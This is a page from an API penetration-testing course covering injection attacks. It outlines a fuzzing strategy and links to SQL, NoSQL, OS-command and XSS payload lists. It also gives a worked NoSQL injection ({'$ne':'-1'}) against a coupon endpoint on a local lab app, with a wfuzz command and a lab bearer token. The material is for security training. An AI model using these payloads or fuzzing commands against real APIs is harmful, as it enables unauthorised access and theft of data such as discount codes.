---
title: Injection attacks
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - api
---

# Injection Attacks

??? abstract "General index of the course"
    - [Setting up the environment](setting-up-kali.md)
    - [Api Reconnaissance](api-reconnaissance.md).
    - [Endpoint Analysis](endpoint-analysis.md).
    - [Scanning APIS](scanning-apis.md).
    - [API Authorization Attacks](api-authentication-attacks.md).
    - [Exploiting API Authorization](exploiting-api-authorization.md).
	- [Testing for Improper Assets Management](improper-assets-management.md).
    - [Mass Assignment](docs/hackingapis/mass-assignment.md).
    - [Server side Request Forgery](server-side-request-forgery-ssrf.md).
    - [Injection Attacks](injection-attacks.md). 
    - [Evasion and Combining techniques](evasion-combining-techniques.md).
    - [Setting up the labs + Writeups](other-labs.md)

The art of fuzzing is knowing which payload to send in the right request with the right tool.

- Right payload can be narrow with reconnaissance.
- Right requests are those that include user input (+ headers + url paths)
- Right tool depends on strategy in fuzzing.

Yes, when fuzzing we need **a strategy**.

**1**. Identify endpoints (those where client input can interact with a database).

**2**. Fuzzing and analyzing responses.

**3**. Analyze responses:

	- Verbose error message
	- Response code
	- Time in response.

**4**. Identify technolofy, version, services behind, security controls.



## SQL injections

[More aboyut SQL injectios](../webexploitation/sql-injection.md). | [How to perform a manual attack in SQL](../sqli-manual-attack.md) |  [Simple payloads](https://raw.githubusercontent.com/amandaguglieri/dictionaries/main/SQL-injection.md) |  [Tools: SQLmap](../sqlmap.md)


## NOSQL injections

[Simple payloads](https://raw.githubusercontent.com/amandaguglieri/dictionaries/main/nosql-injection.md). 

API commonly use NOSQL databases due to the fact that they scale well.  These databases have unique structures, modes of querying... Requests will be alike but payloads may vary. 


## Operating System Command Injection

[Simple payloads](https://raw.githubusercontent.com/amandaguglieri/dictionaries/main/operating-system-command-injection.md)

Some common operatiing system commands that are used in Injection attacks: 

- ipconfig
- dir
- ver
- whoami
- ifconfig
- ls
- pwd
- whoami

Target:

- URL query string
- Requests parameters
- headers
- requests that throw verbose error messages 

Techniques:

- Pairing multiple commands in a single line.


## XSS  Cross-Site Scripting

[More about Cross-Site Scripting](../webexploitation/cross-site-scripting-xss.md) | [Simple payloads](https://raw.githubusercontent.com/amandaguglieri/dictionaries/main/cross-site-scripting-xss.md) 



## Using wfuff

Having this request:

```
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
host: localhost:8888
accept: */*
origin: http://localhost:8888
referer: http://localhost:8888/shop
Connection: close
user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
content-type: application/json
Content-Length: 29
sec-fetch-dest: empty
sec-fetch-mode: cors
sec-fetch-site: same-origin
Accept-Encoding: gzip, deflate
accept-language: en-US,en;q=0.5
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJoYXBpaGFja2VyNTU1NUBoYXBpaGFjaGVyLmNvbSIsImlhdCI6MTY3NTY5NjY3NiwiZXhwIjoxNjc1NzgzMDc2fQ.2_B9Rh_kERjiz4J4c4kIRjktNJ3s4jXOPRCJrLlOJrXV5cC-SgYDF3BxcBDzDJTqZTNtS26-fnprUr9bdenAeg
Cache-Control: no-cache
Postman-Token: 5eb2f69b-6f89-460b-a49f-96c12edc9906

{"coupon_code":{"$ne":"-1"} }
```


And this response:

```
HTTP/1.1 200 OK
Server: openresty/1.17.8.2
Date: Mon, 06 Feb 2023 16:05:31 GMT
Content-Type: application/json
Connection: close
Access-Control-Allow-Headers: Accept, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization
Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE
Access-Control-Allow-Origin: *
Content-Length: 79

{"coupon_code":"TRAC075","amount":"75","CreatedAt":"2022-11-11T19:22:26.134Z"}
```

We can use wfuzz like this:

```bash
wfuzz -z file,/usr/share/wordlists/nosql.txt -H "Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJoYXBpaGFja2VyNTU1NUBoYXBpaGFjaGVyLmNvbSIsImlhdCI6MTY3NTY5NjY3NiwiZXhwIjoxNjc1NzgzMDc2fQ.2_B9Rh_kERjiz4J4c4kIRjktNJ3s4jXOPRCJrLlOJrXV5cC-SgYDF3BxcBDzDJTqZTNtS26-fnprUr9bdenAeg" -H "Content-Type: application/json" -d "{\"coupon_code\":FUZZ}" --sc 200 -p localhost:8080 http://localhost:8888/community/api/v2/coupon/validate-coupon
# -p localhost:8080 Redirect traffic to BurpSuite
# --sc 200 Show code response 200
```

